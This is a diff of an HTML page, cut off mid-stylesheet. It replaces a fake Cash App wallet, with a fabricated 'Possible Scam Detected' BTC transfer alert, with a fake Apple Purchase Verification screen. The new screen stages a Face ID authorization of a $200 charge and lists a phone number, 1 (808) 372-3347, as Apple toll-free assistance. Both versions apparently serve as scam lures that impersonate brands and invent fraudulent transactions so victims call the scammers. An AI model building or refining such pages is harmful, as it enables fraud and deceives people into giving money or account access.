@@ -1,1271 +1,2740 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Cash App Wallet</title>
+<meta
+name="viewport"
+content="width=device-width, initial-scale=1.0">
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<title>Apple Purchase Verification</title>
 
 <style>
 
+/* =====================================
+   RESET
+===================================== */
+
 *{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Inter',sans-serif;
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+html,
+body{
+
+width:100%;
+overflow-x:hidden;
+
+font-family:
+-apple-system,
+BlinkMacSystemFont,
+"SF Pro Display",
+"Segoe UI",
+sans-serif;
+
+background:#000;
+color:#fff;
+
+}
+
+/* =====================================
+   GLOBAL
+===================================== */
+
+.hidden{
+display:none !important;
 }
 
 body{
-    background:#00d64f;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    min-height:100vh;
-    overflow:hidden;
+
+background:
+linear-gradient(
+180deg,
+#000000 0%,
+#090909 100%
+);
+
+min-height:100vh;
+
 }
 
-/* APP */
-
-.app{
-    width:390px;
-    height:844px;
-    background:#f7f7f7;
-    border-radius:38px;
-    overflow:hidden;
-    position:relative;
-    box-shadow:
-    0 20px 60px rgba(0,0,0,.18);
-}
-
-/* =========================
+/* =====================================
    SPLASH SCREEN
-========================= */
+   (FILE 1)
+===================================== */
 
-.splash{
-    position:absolute;
-    inset:0;
-    background:#00d64f;
-    z-index:9999;
+.start{
 
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
+position:fixed;
+inset:0;
 
-    transition:.5s ease;
+display:flex;
+flex-direction:column;
+
+justify-content:center;
+align-items:center;
+
+background:
+linear-gradient(
+180deg,
+#1c1c1e 0%,
+#000000 100%
+);
+
+z-index:99999;
+
 }
-
-.splash-logo{
-    width:110px;
-    height:110px;
-    border-radius:28px;
-    background:#fff;
-
-    display:flex;
-    justify-content:center;
-    align-items:center;
-
-    overflow:hidden;
-
-    box-shadow:
-    0 10px 40px rgba(0,0,0,.12);
-}
-
-.splash-logo img{
-    width:72%;
-    height:72%;
-    object-fit:contain;
-}
-
-.loader{
-    width:42px;
-    height:42px;
-    border-radius:50%;
-
-    border:3px solid rgba(255,255,255,.35);
-    border-top:3px solid #fff;
-
-    margin-top:34px;
-
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    100%{
-        transform:rotate(360deg);
-    }
-}
-
-.loading-text{
-    margin-top:22px;
-    color:#fff;
-    font-size:15px;
-    font-weight:600;
-    letter-spacing:.2px;
-}
-
-/* =========================
-   PIN SCREEN
-========================= */
-
-.pin-screen{
-    position:absolute;
-    inset:0;
-    background:#00d64f;
-
-    z-index:9998;
-
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-
-    opacity:0;
-    pointer-events:none;
-
-    transition:.5s ease;
-}
-
-.pin-title{
-    color:#fff;
-    font-size:26px;
-    font-weight:800;
-    margin-bottom:38px;
-}
-
-.pin-dots{
-    display:flex;
-    gap:18px;
-}
-
-.dot{
-    width:20px;
-    height:20px;
-    border-radius:50%;
-    background:rgba(255,255,255,.25);
-
-    transition:.25s ease;
-}
-
-.dot.active{
-    background:#fff;
-    transform:scale(1.08);
-}
-
-/* =========================
-   MAIN PAGE
-========================= */
-
-.main{
-    position:absolute;
-    inset:0;
-
-    background:#f7f7f7;
-
-    transform:translateY(40px);
-    opacity:0;
-
-    transition:.7s cubic-bezier(.2,.8,.2,1);
-
-    overflow-y:auto;
-    overflow-x:hidden;
-    padding-bottom:120px; /* keeps last transactions above bottom nav */
-    -webkit-overflow-scrolling:touch;
-}
-
-/* STATUS */
-
-.status{
-    height:54px;
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:0 24px;
-
-    color:#000;
-    font-size:14px;
-    font-weight:700;
-}
-
-/* TOPBAR */
-
-.topbar{
-    padding:8px 22px 0;
-
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-}
-
-/* LOGO */
 
 .logo{
-    width:50px;
-    height:50px;
-    border-radius:16px;
-    background:#00d64f;
 
-    display:flex;
-    justify-content:center;
-    align-items:center;
+display:flex;
+align-items:center;
+justify-content:center;
 
-    overflow:hidden;
+width:140px;
+height:140px;
+
+}
+
+.apple-logo-white svg{
+
+width:90px;
+height:110px;
+
+display:block;
+
+filter:
+drop-shadow(0 0 30px rgba(255,255,255,.15));
+
 }
 
 .logo img{
-    width:72%;
-    height:72%;
-    object-fit:contain;
+
+width:100%;
+height:100%;
+
+object-fit:cover;
+
+display:block;
+
 }
 
-/* PROFILE */
+.spinner{
 
-.profile{
-    width:44px;
-    height:44px;
-    border-radius:50%;
+width:54px;
+height:54px;
 
-    background:#fff;
+border-radius:50%;
 
-    border:1px solid #ececec;
+margin-top:28px;
 
-    display:flex;
-    justify-content:center;
-    align-items:center;
+border:4px solid rgba(255,255,255,.12);
 
-    font-size:18px;
+border-top:4px solid #ffffff;
+
+animation:
+spin 1s linear infinite;
+
 }
 
-/* HEADER */
+#status{
+
+margin-top:22px;
+
+font-size:15px;
+
+font-weight:500;
+
+color:
+rgba(255,255,255,.78);
+
+letter-spacing:.2px;
+
+}
+
+@keyframes spin{
+
+100%{
+transform:rotate(360deg);
+}
+
+}
+
+/* =====================================
+   FLASH EFFECT
+===================================== */
+
+.shutter-flash{
+
+position:fixed;
+
+top:0;
+left:0;
+
+width:100%;
+height:100%;
+
+background:#fff;
+
+opacity:0;
+
+pointer-events:none;
+
+z-index:99998;
+
+}
+
+@keyframes flashEffect{
+
+0%{
+opacity:0;
+}
+
+20%{
+opacity:1;
+}
+
+100%{
+opacity:0;
+}
+
+}
+
+/* =====================================
+   FACE ID OVERLAY
+   (FILE 2)
+===================================== */
+
+.faceid-overlay{
+
+position:fixed;
+
+top:0;
+left:0;
+
+width:100vw;
+height:100vh;
+
+background:
+rgba(0,0,0,.88);
+
+display:flex;
+
+justify-content:center;
+align-items:center;
+
+padding:20px;
+
+z-index:99997;
+
+transition:
+opacity .6s cubic-bezier(.19,1,.22,1);
+
+}
+
+.faceid-popup{
+
+width:100%;
+max-width:360px;
+
+background:#1c1c1e;
+
+border-radius:34px;
+
+padding:30px;
+
+box-shadow:
+0 24px 48px rgba(0,0,0,.8);
+
+transition:
+transform .5s cubic-bezier(.34,1.56,.64,1),
+opacity .4s ease;
+
+}
+
+.popup-header{
+
+display:flex;
+
+justify-content:space-between;
+align-items:center;
+
+margin-bottom:24px;
+
+}
+
+.apple-pay-title{
+
+display:flex;
+align-items:center;
+
+font-size:20px;
+font-weight:600;
+
+}
+
+.amount-top{
+
+font-size:16px;
+
+color:#bcbcbc;
+
+font-weight:500;
+
+}
+
+.pay-row{
+
+display:flex;
+
+justify-content:space-between;
+align-items:center;
+
+padding-bottom:20px;
+
+margin-bottom:26px;
+
+border-bottom:
+1px solid #2c2c2e;
+
+}
+
+.pay-label{
+
+color:#8e8e93;
+font-size:15px;
+
+}
+
+.pay-value{
+
+font-size:17px;
+font-weight:600;
+
+}
+
+/* =====================================
+   FACE ID ANIMATION
+===================================== */
+
+.faceid-container{
+
+display:flex;
+
+flex-direction:column;
+
+align-items:center;
+justify-content:center;
+
+}
+
+.circle-wrapper{
+
+position:relative;
+
+width:150px;
+height:150px;
+
+display:flex;
+
+justify-content:center;
+align-items:center;
+
+margin-bottom:24px;
+
+}
+
+.circle-wrapper::before{
+
+content:"";
+
+position:absolute;
+
+top:0;
+left:0;
+
+width:100%;
+height:100%;
+
+border-radius:50%;
+
+border:
+3px solid rgba(255,255,255,.08);
+
+border-top-color:#34c759;
+border-right-color:#34c759;
+
+animation:
+spin 1.8s linear infinite;
+
+}
+
+.faceid-box{
+
+width:104px;
+height:104px;
+
+border-radius:28px;
+
+border:
+2px dashed rgba(255,255,255,.18);
+
+display:flex;
+
+justify-content:center;
+align-items:center;
+
+position:relative;
+
+overflow:hidden;
+
+animation:
+pulseBox 2s ease-in-out infinite;
+
+}
+
+.faceid-box::before{
+
+content:"";
+
+position:absolute;
+
+width:100%;
+height:3px;
+
+background:
+linear-gradient(
+90deg,
+transparent,
+#34c759,
+transparent
+);
+
+box-shadow:
+0 0 12px #34c759;
+
+top:0;
+
+animation:
+sweep 2.2s ease-in-out infinite;
+
+}
+
+.auth-text{
+
+font-size:18px;
+font-weight:600;
+
+margin-bottom:8px;
+
+}
+
+.sub-text{
+
+font-size:14px;
+
+text-align:center;
+
+color:#8e8e93;
+
+line-height:1.5;
+
+}
+
+@keyframes pulseBox{
+
+0%,100%{
+border-color:
+rgba(255,255,255,.15);
+}
+
+50%{
+border-color:#34c759;
+}
+
+}
+
+@keyframes sweep{
+
+0%{
+top:0;
+opacity:0;
+}
+
+15%{
+opacity:1;
+}
+
+85%{
+opacity:1;
+}
+
+100%{
+top:100%;
+opacity:0;
+}
+
+}
+
+/* =====================================
+   MAIN APP CONTAINER
+===================================== */
+
+.app-container{
+
+width:100%;
+
+max-width:1200px;
+
+margin:auto;
+
+opacity:0;
+
+transition:
+opacity .6s ease;
+
+}
+
+/* =====================================
+   HEADER
+===================================== */
 
 .header{
-    padding:14px 24px 10px;
-}
 
-/* CHART */
+position:sticky;
 
-.mini-chart{
-    margin-top:6px;
-    background:#fff;
-    border-radius:30px;
-    padding:22px;
-    border:1px solid #ececec;
-}
+top:0;
 
-.chart-top{
-    display:flex;
-    justify-content:space-between;
-    align-items:flex-start;
-    margin-bottom:14px;
-}
+z-index:100;
 
-.chart-balance{
-    font-size:34px;
-    font-weight:800;
-    letter-spacing:-1px;
-    color:#000;
-}
+display:flex;
 
-.chart-growth{
-    margin-top:6px;
-    color:#00c94a;
-    font-size:14px;
-    font-weight:700;
-}
+justify-content:space-between;
+align-items:center;
 
-.chart-pill{
-    background:#e8fff0;
-    color:#00c94a;
-    padding:8px 14px;
-    border-radius:999px;
-    font-size:12px;
-    font-weight:800;
-}
+padding:18px 24px;
 
-.chart-svg{
-    width:100%;
-    height:120px;
-    display:block;
-}
+background:
+rgba(28,28,30,.92);
 
-/* CTA */
+backdrop-filter:
+blur(24px);
 
-.cta{
-    margin:0 24px 24px;
-    background:#00d64f;
-    border-radius:30px;
-    padding:18px;
-    color:#fff;
-    position:relative;
-    overflow:hidden;
-}
-
-.cta::after{
-    content:"";
-    position:absolute;
-    right:-40px;
-    top:-40px;
-
-    width:160px;
-    height:160px;
-
-    border-radius:50%;
-
-    background:rgba(255,255,255,.12);
-}
-
-.cta-title{
-    font-size:20px;
-    font-weight:700;
-    position:relative;
-    z-index:2;
-}
-
-.cta-sub{
-    margin-top:8px;
-    font-size:14px;
-    line-height:1.5;
-    width:75%;
-
-    color:rgba(255,255,255,.92);
-
-    position:relative;
-    z-index:2;
-}
-
-.cta-btn{
-    margin-top:18px;
-    display:inline-flex;
-    align-items:center;
-    gap:10px;
-
-    background:#fff;
-    color:#000;
-
-    padding:14px 20px;
-
-    border-radius:999px;
-
-    text-decoration:none;
-
-    font-size:15px;
-    font-weight:700;
-
-    position:relative;
-    z-index:2;
-}
-
-/* SECTION */
-
-.section{
-    padding:0 24px;
-}
-
-.section-head{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    margin-bottom:18px;
-}
-
-.section-title{
-    font-size:21px;
-    font-weight:800;
-    color:#000;
-}
-
-.see-all{
-    font-size:14px;
-    font-weight:700;
-    color:#00c94a;
-}
-
-/* ACTIVITY */
-
-.activity-card{
-    background:#fff;
-    border-radius:28px;
-    padding:8px 18px;
-    border:1px solid #ededed;
-}
-
-/* ITEM */
-
-.item{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-
-    padding:18px 0;
-
-    border-bottom:1px solid #f1f1f1;
-}
-
-.item:last-child{
-    border:none;
-}
-
-.item-left{
-    display:flex;
-    align-items:center;
-    gap:14px;
-}
-
-/* ICON */
-
-.icon{
-    width:54px;
-    height:54px;
-    border-radius:18px;
-
-    display:flex;
-    justify-content:center;
-    align-items:center;
-
-    font-size:20px;
-    font-weight:700;
-}
-
-.green{
-    background:#e8fff0;
-    color:#00c94a;
-}
-
-.black{
-    background:#101010;
-    color:#fff;
-}
-
-.soft{
-    background:#f2f2f2;
-    color:#111;
-}
-
-/* TEXT */
-
-.name{
-    font-size:16px;
-    font-weight:700;
-    color:#000;
-}
-
-.time{
-    margin-top:5px;
-    font-size:13px;
-    color:#8a8a8a;
-}
-
-.amount{
-    font-size:18px;
-    font-weight:800;
-}
-
-.plus{
-    color:#00c94a;
-}
-
-.minus{
-    color:#000;
-}
-
-/* NAV */
-
-.nav{
-    position:absolute;
-    left:0;
-    right:0;
-    bottom:0;
-
-    background:#fff;
-    border-top:1px solid #ececec;
-
-    display:flex;
-    justify-content:space-around;
-
-    padding:16px 0 28px;
-
-    z-index:100;
-}
-
-.nav-item{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:7px;
-
-    font-size:12px;
-    font-weight:600;
-
-    color:#9a9a9a;
-}
-
-.nav-item.active{
-    color:#00c94a;
-}
-
-.nav-icon{
-    font-size:22px;
-}
-
-/* SHOW MAIN */
-
-.main.show{
-    transform:translateY(0);
-    opacity:1;
-}
-
-/* MOBILE */
-
-@media(max-width:430px){
-
-    body{
-        background:#f7f7f7;
-    }
-
-    .app{
-        width:100%;
-        height:100vh;
-        border-radius:0;
-    }
+border-bottom:
+1px solid rgba(255,255,255,.05);
 
 }
 
-/* =========================
-   POPUP
-========================= */
+.brand{
 
-/* =========================
-   POPUP
-========================= */
+display:flex;
+align-items:center;
+gap:14px;
 
-.popup-wrap{
-    position:absolute;
-
-    top:126px;
-    left:24px;
-    right:24px;
-
-    z-index:999;
-
-    opacity:0;
-    pointer-events:none;
-
-    transform:
-    translateY(-24px)
-    scale(.92);
-
-    transition:.5s cubic-bezier(.2,.8,.2,1);
 }
 
-.popup-wrap.show{
-    opacity:1;
-    pointer-events:auto;
+.brand-icon{
 
-    transform:
-    translateY(0)
-    scale(1);
+width:46px;
+height:46px;
+
+border-radius:12px;
+
+overflow:hidden;
+
 }
 
-.popup-card{
+.brand-icon img{
 
-    background:
-    rgba(255,255,255,.94);
+width:100%;
+height:100%;
+object-fit:cover;
 
-    backdrop-filter:blur(18px);
-
-    border-radius:32px;
-
-    padding:22px;
-
-    border:
-    1px solid rgba(255,255,255,.7);
-
-    box-shadow:
-    0 30px 80px rgba(0,0,0,.16),
-    0 10px 30px rgba(0,0,0,.08);
-
-    position:relative;
-
-    overflow:hidden;
 }
 
-.popup-card::after{
+.brand-icon-svg{
 
-    content:"";
+width:32px;
+height:38px;
 
-    position:absolute;
+display:flex;
+align-items:center;
+justify-content:center;
 
-    width:180px;
-    height:180px;
-
-    border-radius:50%;
-
-    background:
-    radial-gradient(
-        rgba(0,214,79,.12),
-        transparent
-    );
-
-    top:-80px;
-    right:-60px;
-
-    pointer-events:none;
 }
 
-.popup-badge{
-    display:inline-flex;
+.brand-icon-svg svg{
 
-    background:#e8fff0;
+width:100%;
+height:100%;
 
-    color:#00c94a;
-
-    padding:8px 14px;
-
-    border-radius:999px;
-
-    font-size:11px;
-    font-weight:800;
 }
 
-.popup-amount{
-    margin-top:16px;
+.brand-name{
 
-    font-size:30px;
-    font-weight:800;
+font-size:18px;
+font-weight:700;
 
-    letter-spacing:-1px;
-
-    color:#000;
 }
 
-.popup-user{
-    margin-top:4px;
+.header-right{
 
-    font-size:17px;
-    font-weight:700;
+font-size:14px;
 
-    color:#000;
+color:#8e8e93;
+
 }
 
-.popup-time{
-    margin-top:6px;
+/* =====================================
+   MOBILE
+===================================== */
 
-    color:#8e8e93;
+@media(max-width:768px){
 
-    font-size:13px;
+.header{
+
+flex-direction:column;
+align-items:flex-start;
+
+gap:10px;
+
 }
 
-.popup-btn{
-    width:100%;
+.header-right{
 
-    margin-top:18px;
+font-size:12px;
 
-    border:none;
+line-height:1.5;
 
-    background:#00d64f;
-    color:#fff;
-
-    padding:15px;
-
-    border-radius:16px;
-
-    font-size:14px;
-    font-weight:700;
-
-    cursor:pointer;
 }
 
-.popup-support{
-    display:flex;
-    justify-content:center;
+.faceid-popup{
 
-    margin-top:12px;
+padding:24px;
 
-    text-decoration:none;
+}
 
-    color:#00c94a;
+}
 
-    font-size:13px;
-    font-weight:700;
+.apple-pay-title{
+
+display:flex;
+align-items:center;
+
+font-size:20px;
+font-weight:600;
+
+}
+
+.apple-logo-svg{
+
+width:18px;
+height:22px;
+
+margin-right:8px;
+
+color:#ffffff;
+
+display:block;
+
+flex-shrink:0;
+
 }
 
 </style>
+
 </head>
 
 <body>
 
-<div class="app">
+<!-- SPLASH -->
+<div
+class="start"
+id="start">
 
-    <!-- SPLASH -->
+<div class="logo apple-logo-white">
 
-    <div class="splash" id="splash">
+<svg viewBox="0 0 17 20" fill="white">
+<path d="M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71.02-3.29.99-4.17 2.53-1.78 3.1-0.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z"/>
+</svg>
 
-        <div class="splash-logo">
-            <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
-        </div>
+</div>
 
-        <div class="loader"></div>
+<div class="spinner"></div>
 
-        <div class="loading-text" id="loadingText">
-            Cash App...
-        </div>
+<div id="status">
+Preparing secure session...
+</div>
 
-    </div>
+</div>
 
-    <!-- PIN SCREEN -->
+<!-- FLASH -->
+<div
+class="shutter-flash"
+id="flashLayer">
+</div>
 
-    <div class="pin-screen" id="pinScreen">
+<!-- FACE ID -->
+<div
+class="faceid-overlay hidden"
+id="faceIdOverlay">
 
-        <div class="pin-title">
-            Enter Passcode
-        </div>
+<div class="faceid-popup">
 
-        <div class="pin-dots">
+<div class="popup-header">
 
-            <div class="dot" id="d1"></div>
-            <div class="dot" id="d2"></div>
-            <div class="dot" id="d3"></div>
-            <div class="dot" id="d4"></div>
+<div class="apple-pay-title">
 
-        </div>
+<svg
+class="apple-logo-svg"
+viewBox="0 0 17 20"
+fill="currentColor">
 
-    </div>
+<path d="M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71.02-3.29.99-4.17 2.53-1.78 3.1-0.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z"/>
 
-    <!-- MAIN -->
+</svg>
 
-    <div class="main" id="main">
+<span>Pay</span>
 
-        <!-- STATUS -->
+</div>
 
-        <div class="status">
-            <div id="liveTime"></div>
-            <div>5G 🔋</div>
-        </div>
+<div
+class="amount-top"
+id="faceAmount">
 
-        <!-- TOPBAR -->
-
-        <div class="topbar">
-
-            <div class="logo">
-                <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
-            </div>
-
-            <div class="profile">👤</div>
-
-        </div>
-
-        <!-- HEADER -->
-
-        <div class="header">
-
-            <div class="mini-chart">
-
-                <div class="chart-top">
-
-                    <div>
-
-                        <div class="chart-balance">
-                            $12,840
-                        </div>
-
-                        <div class="chart-growth">
-                            +12.4% This Week
-                        </div>
-
-                    </div>
-
-                    <div class="chart-pill">
-                        LIVE
-                    </div>
-
-                </div>
-
-                <svg viewBox="0 0 300 120" class="chart-svg">
-
-                    <path
-                    d="M0 90 
-                       C30 70, 50 80, 70 60
-                       C90 40, 120 50, 140 35
-                       C170 10, 210 30, 240 20
-                       C260 15, 280 25, 300 5"
-
-                    fill="none"
-                    stroke="#00d64f"
-                    stroke-width="5"
-                    stroke-linecap="round"/>
-
-                </svg>
-
-            </div>
-
-        </div>
-
-        <!-- CTA -->
-
-        <div class="cta">
-
-            <div class="cta-title">
-                Need Assistance?
-            </div>
-
-            <div class="cta-sub">
-                Contact our transfer support line for instant account help.
-            </div>
-
-            <a href="tel:18083723347" class="cta-btn">
-                📞 +1 (808) 372-3347
-            </a>
-
-        </div>
-
-        <!-- ACTIVITY -->
-
-        <div class="section">
-
-            <div class="section-head">
-
-                <div class="section-title">
-                    Recent Activity
-                </div>
-
-                <div class="see-all">
-                    See all
-                </div>
-
-            </div>
-
-            <div class="activity-card">
-
-                <!-- ITEM -->
-
-                <div class="item">
-
-                    <div class="item-left">
-
-                        <div class="icon black">
-                            ₿
-                        </div>
-
-                        <div>
-
-                            <div class="name">
-                                Bitcoin Purchase
-                            </div>
-
-                            <div class="time">
-                                Today • 9:18 AM
-                            </div>
-
-                        </div>
-
-                    </div>
-
-                    <div class="amount minus">
-                        -$620
-                    </div>
-
-                </div>
-				
-
-                <!-- ITEM -->
-
-                <div class="item">
-
-                    <div class="item-left">
-
-                        <div class="icon green">
-                            ↓
-                        </div>
-
-                        <div>
-
-                            <div class="name">
-                                Cash Deposit
-                            </div>
-
-                            <div class="time">
-                                Today • 11:42 AM
-                            </div>
-
-                        </div>
-
-                    </div>
-
-                    <div class="amount plus">
-                        +$2,400
-                    </div>
-
-                </div>
-
-
-
-                <!-- ITEM -->
-
-                <div class="item">
-
-                    <div class="item-left">
-
-                        <div class="icon soft">
-                            ↑
-                        </div>
-
-                        <div>
-
-                            <div class="name">
-                                Transfer Sent
-                            </div>
-
-                            <div class="time">
-                                Yesterday • 7:24 PM
-                            </div>
-
-                        </div>
-
-                    </div>
-
-                    <div class="amount minus">
-                        -$185
-                    </div>
-
-                </div>
-
-                <!-- ITEM -->
-
-                <div class="item">
-
-                    <div class="item-left">
-
-                        <div class="icon green">
-                            $
-                        </div>
-
-                        <div>
-
-                            <div class="name">
-                                Payment Received
-                            </div>
-
-                            <div class="time">
-                                Yesterday • 1:02 PM
-                            </div>
-
-                        </div>
-
-                    </div>
-
-                    <div class="amount plus">
-                        +$850
-                    </div>
-
-                </div>
-
-            </div>
-
-        </div>
-
-        
-    </div>
-
-<!-- NAV -->
-
-        <div class="nav">
-
-            <div class="nav-item">
-                <div class="nav-icon">🏠</div>
-            </div>
-
-            <div class="nav-item active">
-                <div class="nav-icon">$</div>
-            </div>
-
-            <div class="nav-item">
-                <div class="nav-icon">↗</div>
-            </div>
-
-            <div class="nav-item">
-                <div class="nav-icon">🕗</div>
-            </div>
-
-        </div>
-		
-		
-<!-- TRANSACTION POPUP -->
-
-<div class="popup-wrap" id="popupWrap">
-
-    <div class="popup-card">
-
-        <div class="popup-badge">
-            Possible Scam Detected
-        </div>
-
-        <div class="popup-amount" id="popupAmount">
-            -$185
-        </div>
-
-        <div class="popup-user">
-            BTC Sent to Alex Morgan
-        </div>
-
-        <div class="popup-time" id="popupTime">
-            Today • 2:41 PM
-        </div>
-
-        <button class="popup-btn" onclick="closePopup()">
-            View Transaction
-        </button>
-
-        <a href="tel:18083723347" class="popup-support">
-            📞 Contact Support
-        </a>
-
-    </div>
+$200
 
 </div>
 
 </div>
+
+<div class="pay-row">
+
+<div class="pay-label">
+Pay
+</div>
+
+<div class="pay-value">
+Apple Services
+</div>
+
+</div>
+
+<div class="faceid-container">
+
+<div class="circle-wrapper">
+
+<div class="faceid-box">
+
+<svg
+width="48"
+height="48"
+viewBox="0 0 24 24"
+fill="none"
+stroke="#ffffff"
+stroke-width="1.5">
+
+<path d="M3 7V5a2 2 0 0 1 2-2h2"/>
+<path d="M17 3h2a2 2 0 0 1 2 2v2"/>
+<path d="M21 17v2a2 2 0 0 1-2 2h-2"/>
+<path d="M7 21H5a2 2 0 0 1-2-2v-2"/>
+<path d="M9 10h.01"/>
+<path d="M15 10h.01"/>
+<path d="M12 12v3"/>
+<path d="M10 17c1 1.5 3 1.5 4 0"/>
+
+</svg>
+
+</div>
+
+</div>
+
+<div class="auth-text">
+Authorizing Face ID
+</div>
+
+<div class="sub-text">
+Glance at your device to authorize.
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- APP STARTS HERE -->
+
+<div
+class="app-container"
+id="appContainer">
+
+<div
+class="header hidden"
+id="header">
+
+<div class="brand">
+
+<div class="brand-icon-svg">
+
+<svg viewBox="0 0 17 20" fill="white">
+<path d="M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71-.02-3.29.99-4.17 2.53-1.78 3.1-.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z"/>
+</svg>
+
+</div>
+
+<div class="brand-name">
+Apple Purchase Center
+</div>
+
+</div>
+
+<div class="header-right">
+USA & Canada Toll Free Assistance
+1 (808) 372-3347
+</div>
+
+</div>
+
+<!-- =====================================
+     PURCHASE REVIEW MODAL
+===================================== -->
+
+<style>
+
+/* =====================================
+   MODAL OVERLAY
+===================================== */
+
+.modal{
+
+position:fixed;
+
+inset:0;
+
+display:flex;
+
+justify-content:center;
+align-items:flex-start;
+
+padding-top:40px;
+
+background:transparent;
+
+backdrop-filter:none;
+
+z-index:9990;
+
+}
+
+.modal-box{
+
+width:100%;
+max-width:520px;
+
+background:
+linear-gradient(
+180deg,
+#1c1c1e 0%,
+#111111 100%
+);
+
+border:
+1px solid rgba(255,255,255,.06);
+
+border-radius:34px;
+
+padding:22px;
+
+position:relative;
+
+overflow:hidden;
+
+box-shadow:
+0 40px 100px rgba(0,0,0,.65);
+
+opacity:0;
+
+transform:
+translateY(30px)
+scale(.95);
+
+animation:
+modalIn .65s cubic-bezier(.2,.8,.2,1)
+forwards;
+
+}
+
+@keyframes modalIn{
+
+0%{
+
+opacity:0;
+
+transform:
+translateY(30px)
+scale(.95);
+
+}
+
+100%{
+
+opacity:1;
+
+transform:
+translateY(0)
+scale(1);
+
+}
+
+}
+
+/* =====================================
+   MODAL GLOW
+===================================== */
+
+.glow{
+
+position:absolute;
+
+width:320px;
+height:320px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+rgba(0,122,255,.18),
+transparent
+);
+
+top:-150px;
+right:-120px;
+
+pointer-events:none;
+
+}
+
+/* =====================================
+   PURCHASE CARD
+===================================== */
+
+.card-preview{
+
+height:230px;
+
+border-radius:28px;
+
+position:relative;
+
+overflow:hidden;
+
+margin-bottom:26px;
+
+background:
+linear-gradient(
+135deg,
+#000000 0%,
+#0f1728 20%,
+#131313 40%,
+#1d1d1f 65%,
+#050505 100%
+);
+
+border:
+1px solid rgba(255,255,255,.06);
+
+box-shadow:
+0 25px 60px rgba(0,0,0,.55);
+
+}
+
+/* subtle lighting */
+
+.card-preview::before{
+
+content:"";
+
+position:absolute;
+
+top:-120px;
+right:-120px;
+
+width:260px;
+height:260px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+rgba(255,255,255,.10),
+transparent 70%
+);
+
+}
+
+/* blue Apple Pay glow */
+
+.card-preview::after{
+
+content:"";
+
+position:absolute;
+
+left:-120px;
+bottom:-120px;
+
+width:240px;
+height:240px;
+
+border-radius:50%;
+
+background:
+radial-gradient(
+rgba(10,132,255,.18),
+transparent 75%
+);
+
+}
+
+.card-title{
+
+position:absolute;
+
+top:22px;
+left:22px;
+
+font-size:18px;
+font-weight:600;
+
+z-index:2;
+
+}
+
+.card-amount{
+
+position:absolute;
+
+left:22px;
+bottom:22px;
+
+font-size:52px;
+font-weight:800;
+
+letter-spacing:-1px;
+
+z-index:2;
+
+}
+
+/* =====================================
+   MODAL TEXT
+===================================== */
+
+.heading{
+
+text-align:center;
+
+font-size:40px;
+
+font-weight:700;
+
+letter-spacing:-1.5px;
+
+margin-bottom:12px;
+
+}
+
+.sub{
+
+text-align:center;
+
+font-size:15px;
+
+line-height:1.7;
+
+color:#8e8e93;
+
+margin-bottom:24px;
+
+}
+
+/* =====================================
+   BADGE
+===================================== */
+
+.badge-wrap{
+
+display:flex;
+justify-content:center;
+
+margin-bottom:24px;
+
+}
+
+.badge{
+
+display:flex;
+
+align-items:center;
+gap:10px;
+
+padding:12px 18px;
+
+border-radius:999px;
+
+background:
+rgba(255,255,255,.05);
+
+border:
+1px solid rgba(255,255,255,.06);
+
+font-size:14px;
+font-weight:700;
+
+}
+
+.dot{
+
+width:10px;
+height:10px;
+
+border-radius:50%;
+
+background:#34c759;
+
+box-shadow:
+0 0 15px #34c759;
+
+animation:
+pulseDot 1.8s infinite;
+
+}
+
+@keyframes pulseDot{
+
+0%,100%{
+transform:scale(1);
+}
+
+50%{
+transform:scale(1.3);
+}
+
+}
+
+/* =====================================
+   INFO PANEL
+===================================== */
+
+.info{
+
+background:
